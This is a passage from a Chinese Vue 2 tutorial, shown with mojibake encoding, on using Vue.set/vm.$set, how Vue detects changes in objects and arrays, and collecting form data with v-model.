ä¸€ä¸ª propertyï¼Œå¹¶ç¡®ä¿è¿™ä¸ªæ–° property åŒæ ·æ˜¯å“åº”å¼çš„ï¼Œä¸”è§¦å‘è§†å›¾æ›´æ–°ã€‚å®ƒå¿…é¡»ç”¨äºå‘å“åº”å¼å¯¹è±¡ä¸Šæ·»åŠ æ–°propertyï¼Œå› ä¸º Vue æ— æ³•æ¢æµ‹æ™®é€šçš„æ–°å¢ property (æ¯”å¦‚ <code>vm.myObject.newProperty = &#39;hi&#39;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å­¦ç”Ÿä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addSex&quot;</span>&gt;</span>æ·»åŠ æ€§åˆ«å±æ€§ï¼Œé»˜è®¤å€¼ï¼šç”·<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">//é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">student</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;tom&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">age</span>:<span class="hljs-number">18</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">hobby</span>:[<span class="hljs-string">&#x27;æŠ½çƒŸ&#x27;</span>,<span class="hljs-string">&#x27;å–é…’&#x27;</span>,<span class="hljs-string">&#x27;çƒ«å¤´&#x27;</span>],</span><br><span class="language-javascript">                <span class="hljs-attr">friends</span>:[</span><br><span class="language-javascript">                    &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jerry&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">35</span>&#125;,</span><br><span class="language-javascript">                    &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;tony&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">36</span>&#125;</span><br><span class="language-javascript">                ]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">addSex</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;ç”·&#x27;)</span></span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>,<span class="hljs-string">&#x27;sex&#x27;</span>,<span class="hljs-string">&#x27;ç”·&#x27;</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Vue.set() æˆ– vm.$set æœ‰ç¼ºé™·ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/954f0312289748c189bac545b4463c63.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>å°±æ˜¯ vm å’Œ _data</p></blockquote><p>çœ‹å®Œäº† vue ç›‘æµ‹å¯¹è±¡ä¸­çš„æ•°æ®ï¼Œå†æ¥çœ‹çœ‹ vue å¦‚ä½•ç›‘æµ‹ æ•°ç»„é‡Œçš„æ•°æ®</p><blockquote><p>å…ˆå†™ä¸ªä»£ç æ¡ˆä¾‹</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å­¦ç”Ÿä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;student.age++&quot;</span>&gt;</span>å¹´é¾„+1å²<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addSex&quot;</span>&gt;</span>æ·»åŠ æ€§åˆ«å±æ€§ï¼Œé»˜è®¤å€¼ï¼šç”·<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;student.sex = &#x27;æœªçŸ¥&#x27; &quot;</span>&gt;</span>ä¿®æ”¹æ€§åˆ«<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addFriend&quot;</span>&gt;</span>åœ¨åˆ—è¡¨é¦–ä½æ·»åŠ ä¸€ä¸ªæœ‹å‹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateFirstFriendName&quot;</span>&gt;</span>ä¿®æ”¹ç¬¬ä¸€ä¸ªæœ‹å‹çš„åå­—ä¸ºï¼šå¼ ä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;delteFirstFriendName&quot;</span>&gt;</span>åˆ é™¤ç¬¬ä¸€ä¸ªæœ‹å‹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addHobby&quot;</span>&gt;</span>æ·»åŠ ä¸€ä¸ªçˆ±å¥½<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateHobby&quot;</span>&gt;</span>ä¿®æ”¹ç¬¬ä¸€ä¸ªçˆ±å¥½ä¸ºï¼šå¼€è½¦<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;removeSmoke&quot;</span>&gt;</span>è¿‡æ»¤æ‰çˆ±å¥½ä¸­çš„æŠ½çƒŸ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å§“åï¼š&#123;&#123; student.name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å¹´é¾„ï¼š&#123;&#123; student.age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;student.sex&quot;</span>&gt;</span>æ€§åˆ«ï¼š&#123;&#123;student.sex&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>çˆ±å¥½ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(h,index) in student.hobby&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; h &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æœ‹å‹ä»¬ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(f,index) in student.friends&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; f.name &#125;&#125;--&#123;&#123; f.age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">student</span>: &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;tom&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">hobby</span>: [<span class="hljs-string">&#x27;æŠ½çƒŸ&#x27;</span>, <span class="hljs-string">&#x27;å–é…’&#x27;</span>, <span class="hljs-string">&#x27;çƒ«å¤´&#x27;</span>],</span><br><span class="language-javascript">                    <span class="hljs-attr">friends</span>: [</span><br><span class="language-javascript">                        &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jerry&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span> &#125;,</span><br><span class="language-javascript">                        &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;tony&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">36</span> &#125;</span><br><span class="language-javascript">                    ]</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">addSex</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;ç”·&#x27;)</span></span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>, <span class="hljs-string">&#x27;sex&#x27;</span>, <span class="hljs-string">&#x27;ç”·&#x27;</span>)</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">addFriend</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">friends</span>.<span class="hljs-title function_">unshift</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">70</span> &#125;)</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">updateFirstFriendName</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">//this.student.friends[0]æ˜¯å¯¹è±¡é»˜è®¤æ˜¯å“åº”å¼</span></span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">friends</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span></span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">delteFirstFriendName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">friends</span>[<span class="hljs-number">0</span>]=&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">70</span> &#125;</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">addHobby</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">hobby</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;å­¦ä¹ &#x27;</span>)</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">updateHobby</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// this.student.hobby.splice(0,1,&#x27;å¼€è½¦&#x27;)</span></span><br><span class="language-javascript">                    <span class="hljs-comment">// Vue.set(this.student.hobby,0,&#x27;å¼€è½¦&#x27;)</span></span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">hobby</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;å¼€è½¦&#x27;</span>)</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">removeSmoke</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">hobby</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">hobby</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">h</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">return</span> h !== <span class="hljs-string">&#x27;æŠ½çƒŸ&#x27;</span></span><br><span class="language-javascript">                    &#125;)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124115132933.png" alt="image-20221124115132933"></p><blockquote><p>æ‰€ä»¥æˆ‘ä»¬é€šè¿‡ vm._data.student.hobby[0] &#x3D; â€˜aaaâ€™ &#x2F;&#x2F; ä¸å¥æ•ˆ</p><p>vue ç›‘æµ‹åœ¨æ•°ç»„é‚£æ²¡æœ‰ getter å’Œ setterï¼Œæ‰€ä»¥ç›‘æµ‹ä¸åˆ°æ•°æ®çš„æ›´æ”¹ï¼Œä¹Ÿä¸ä¼šå¼•èµ·é¡µé¢çš„æ›´æ–°</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124115153647.png" alt="image-20221124115153647"></p><p>æ—¢ç„¶ vue åœ¨å¯¹æ•°ç»„æ— æ³•é€šè¿‡ getter å’Œ setter è¿›è¡Œæ•°æ®ç›‘è§†ï¼Œé‚£ vue åˆ°åº•å¦‚ä½•ç›‘è§†æ•°ç»„æ•°æ®çš„å˜åŒ–å‘¢ï¼Ÿ</p><p>vueå¯¹æ•°ç»„çš„ç›‘æµ‹æ˜¯é€šè¿‡ åŒ…è£…æ•°ç»„ä¸Šå¸¸ç”¨çš„ç”¨äºä¿®æ”¹æ•°ç»„çš„æ–¹æ³•æ¥å®ç°çš„ã€‚</p><p>vueå®˜ç½‘çš„è§£é‡Šï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124115209402.png" alt="image-20221124115209402"></p><p><strong>æ€»ç»“ ï¼š</strong></p><p>Vueç›‘è§†æ•°æ®çš„åŸç†ï¼š</p><ol><li><p>vueä¼šç›‘è§†data<strong>ä¸­æ‰€æœ‰å±‚æ¬¡çš„æ•°æ®</strong></p></li><li><p>å¦‚ä½•ç›‘æµ‹<strong>å¯¹è±¡</strong>ä¸­çš„æ•°æ®ï¼Ÿ</p><p>é€šè¿‡setterå®ç°ç›‘è§†ï¼Œä¸”è¦åœ¨new Vueæ—¶å°±ä¼ å…¥è¦ç›‘æµ‹çš„æ•°æ®ã€‚</p><ul><li>å¯¹è±¡ä¸­åè¿½åŠ çš„å±æ€§ï¼ŒVueé»˜è®¤ä¸åšå“åº”å¼å¤„ç†</li><li>å¦‚éœ€ç»™åæ·»åŠ çš„å±æ€§åšå“åº”å¼ï¼Œè¯·ä½¿ç”¨å¦‚ä¸‹APIï¼š</li></ul></li></ol><p><code>Vue.set(targetï¼ŒpropertyName/indexï¼Œvalue) </code></p><p><code>vm.$set(targetï¼ŒpropertyName/indexï¼Œvalue)</code></p><ol start="3"><li><p>å¦‚ä½•ç›‘æµ‹æ•°ç»„ä¸­çš„æ•°æ®ï¼Ÿ</p><p>é€šè¿‡åŒ…è£¹æ•°ç»„æ›´æ–°å…ƒç´ çš„æ–¹æ³•å®ç°ï¼Œæœ¬è´¨å°±æ˜¯åšäº†ä¸¤ä»¶äº‹ï¼š</p><ul><li>è°ƒç”¨åŸç”Ÿå¯¹åº”çš„æ–¹æ³•å¯¹æ•°ç»„è¿›è¡Œæ›´æ–°</li><li>é‡æ–°è§£ææ¨¡æ¿ï¼Œè¿›è€Œæ›´æ–°é¡µé¢</li></ul></li><li><p>åœ¨Vueä¿®æ”¹æ•°ç»„ä¸­çš„æŸä¸ªå…ƒç´ ä¸€å®šè¦ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š</p><ul><li>ä½¿ç”¨è¿™äº›API:push()ã€pop()ã€shift()ã€unshift()ã€splice()ã€sort()ã€reverse()</li><li>Vue.set() æˆ– vm.$set()</li></ul></li></ol><blockquote><p>ç‰¹åˆ«æ³¨æ„ï¼šVue.set() å’Œ vm.$set() ä¸èƒ½ç»™vm æˆ– vmçš„æ ¹æ•°æ®å¯¹è±¡ æ·»åŠ å±æ€§ï¼ï¼ï¼</p></blockquote><h2 id="1-15-æ”¶é›†è¡¨å•æ•°æ®"><a href="#1-15-æ”¶é›†è¡¨å•æ•°æ®" class="headerlink" title="1.15 æ”¶é›†è¡¨å•æ•°æ®"></a>1.15 æ”¶é›†è¡¨å•æ•°æ®</h2><p>æ”¶é›†è¡¨å•æ•°æ®</p><ul><li><p>è‹¥<code>&lt;input type=&quot;text&quot;/&gt;</code>ï¼Œåˆ™v-modelæ”¶é›†çš„æ˜¯valueå€¼ï¼Œç”¨æˆ·è¾“å…¥çš„å†…å®¹å°±æ˜¯valueå€¼</p></li><li><p>è‹¥<code>&lt;input type=&quot;radio&quot;/&gt;</code>ï¼Œåˆ™v-modelæ”¶é›†çš„æ˜¯valueå€¼ï¼Œä¸”è¦ç»™æ ‡ç­¾é…ç½®valueå±æ€§</p></li><li><p>è‹¥<code>&lt;input type=&quot;checkbox&quot;/&gt;</code> </p><ul><li>æ²¡æœ‰é…ç½®valueå±æ€§ï¼Œé‚£ä¹ˆæ”¶é›†çš„æ˜¯checkedå±æ€§ï¼ˆå‹¾é€‰ or æœªå‹¾é€‰ï¼Œæ˜¯å¸ƒå°”å€¼ï¼‰</li><li>é…ç½®äº†valueå±æ€§<ul><li>v-modelçš„åˆå§‹å€¼æ˜¯éæ•°ç»„ï¼Œé‚£ä¹ˆæ”¶é›†çš„å°±æ˜¯checkedï¼ˆå‹¾é€‰ or æœªå‹¾é€‰ï¼Œæ˜¯å¸ƒå°”å€¼ï¼‰</li><li>v-modelçš„åˆå§‹å€¼æ˜¯æ•°ç»„ï¼Œé‚£ä¹ˆæ”¶é›†çš„å°±æ˜¯valueç»„æˆçš„æ•°ç»„</li></ul></li></ul></li><li><p>v-modelçš„ä¸‰ä¸ªä¿®é¥°ç¬¦</p><ul><li><p>lazyå¤±å»ç„¦ç‚¹åå†æ”¶é›†æ•°æ®</p></li><li><p>number è¾“å…¥å­—ç¬¦ä¸²è½¬ä¸ºæœ‰æ•ˆçš„æ•°å­—</p></li><li><p>trimè¾“å…¥é¦–å°¾ç©ºæ ¼è¿‡æ»¤</p></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ”¶é›†è¡¨å•æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> @<span class="hljs-attr">submit.prevent</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>    è´¦å·ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model.trim</span>=<span class="hljs-string">&quot;userInfo.account&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    å¯†ç ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.password&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    å¹´é¾„ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">v-model.number</span>=<span class="hljs-string">&quot;userInfo.age&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    æ€§åˆ«ï¼š<br>    ç”·<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span><br>    å¥³<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    çˆ±å¥½ï¼š<br>    å­¦ä¹ <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span 